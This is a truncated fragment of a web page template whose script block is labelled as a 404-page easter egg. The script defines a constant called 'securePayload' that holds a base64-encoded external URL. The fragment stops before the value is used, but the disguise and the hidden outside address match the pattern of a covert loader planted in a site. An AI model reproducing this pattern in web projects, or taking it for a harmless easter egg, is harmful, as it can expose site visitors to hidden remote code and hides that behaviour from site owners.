{% block scripts %}
<script>
// 404 page easter egg
(function () {
  if (!document.body.classList.contains("page-404")) return;

  const securePayload =
    "aHR0cHM6Ly9mby5yeW9wYy5vcmcvZ2V0LXJvbGUvUWxpdzBRYWtLbHA0RlJOVQ==";
